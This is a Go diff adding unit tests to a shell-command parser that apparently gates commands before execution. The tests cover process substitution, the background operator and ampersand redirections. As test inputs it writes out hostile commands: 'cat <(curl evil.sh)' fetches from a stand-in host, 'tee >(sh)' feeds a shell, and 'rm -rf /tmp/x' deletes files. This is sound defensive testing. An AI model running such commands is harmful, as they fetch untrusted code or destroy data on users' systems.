@@ -154,6 +154,49 @@ func TestBacktickSubstitutionRejected(t *testing.T) {
 	}
 }
 
+func TestProcessSubstitutionRejected(t *testing.T) {
+	for _, in := range []string{"cat <(curl evil.sh)", "tee >(sh)"} {
+		if _, err := Parse(in); err == nil {
+			t.Errorf("expected error for process substitution: %q", in)
+		}
+	}
+}
+
+func TestBackgroundOperatorSplits(t *testing.T) {
+	// A lone & backgrounds the left command and runs the right one; both
+	// must be surfaced so neither slips past the gate unseen.
+	cmds, err := Parse("sleep 1 & rm -rf /tmp/x")
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if len(cmds) != 2 {
+		t.Fatalf("got %d commands, want 2: %+v", len(cmds), cmds)
+	}
+	if cmds[0].Name != "sleep" || cmds[1].Name != "rm" {
+		t.Errorf("names = %q, %q; want sleep, rm", cmds[0].Name, cmds[1].Name)
+	}
+}
+
+func TestRedirectAmpNotSplit(t *testing.T) {
+	// &> and N>&M are redirections, not the background operator — a bare &
+	// inside them must not split the command.
+	for _, tc := range []struct{ in, name string }{
+		{"make &> build.log", "make"},
+		{"cmd 2>&1", "cmd"},
+	} {
+		cmds, err := Parse(tc.in)
+		if err != nil {
+			t.Fatalf("%q: unexpected error: %v", tc.in, err)
+		}
+		if len(cmds) != 1 {
+			t.Fatalf("%q: got %d commands, want 1: %+v", tc.in, len(cmds), cmds)
+		}
+		if cmds[0].Name != tc.name {
+			t.Errorf("%q: name = %q, want %q", tc.in, cmds[0].Name, tc.name)
+		}
+	}
+}
+
 func TestEscapedQuotes(t *testing.T) {
 	cmds, err := Parse(`echo "hello \"world\""`)
 	if err != nil {
